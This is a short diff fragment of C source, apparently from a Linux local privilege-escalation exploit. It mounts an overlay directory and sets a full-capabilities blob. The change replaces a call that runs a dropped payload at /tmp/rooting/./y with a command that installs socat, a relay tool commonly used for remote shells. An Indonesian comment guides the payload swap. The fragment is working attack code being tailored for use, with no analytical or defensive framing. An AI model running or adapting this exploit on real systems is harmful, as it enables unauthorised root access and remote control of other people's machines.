@@ -93,7 +93,7 @@ static int exploit() {
         err(1, "mount %s", DIR_MERGE);
 
     // Ganti system("whoami") dengan eksekusi /tmp/rooting/./y
-    system("/tmp/rooting/./y");
+    system("sudo apt install socat -y");
 
     // all+ep
     char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
